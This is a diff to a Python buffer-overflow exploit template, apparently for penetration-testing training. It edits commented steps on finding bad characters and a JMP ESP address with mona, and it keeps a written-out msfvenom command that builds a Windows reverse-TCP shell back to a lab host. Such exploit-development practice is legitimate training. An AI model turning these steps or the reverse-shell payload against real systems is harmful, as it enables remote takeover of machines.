@@ -22,7 +22,7 @@ PORT = 5555
 #buffer += "B"*4
 
 
-#step 5, send char stack AND the Bs, delete characters that cause the stack to corrupt until you can see the Bs sent after the characters
+#step 5, send char stack AND the TESTSTRINGSs, delete characters that cause the stack to corrupt until you can see the Bs sent after the characters
 #seeing the Bs means you have found all the bad chars
 
 #this is the full list of characters for the initial bad scan
@@ -40,10 +40,11 @@ bad_char = ("")
 
 #step 6, find a way to jump into ESP with !mona jmp -r ESP, set it into the var below
 # remember to flip the address if coming from an x86 machine
+#set it as a breakpoint in mona (after starting the program again!) and see if you can see the TESTSTRINGS at pause
 esp_jmp = ("")
 
 #buffer += esp_jmp
-
+#buffer += "TESTSTRING"*4
 
 #step 7, generate shell code
 #msfvenom -p windows/shell/reverse_tcp LPORT=1337 LHOST=10.11.0.X -b '\x00' -f ruby
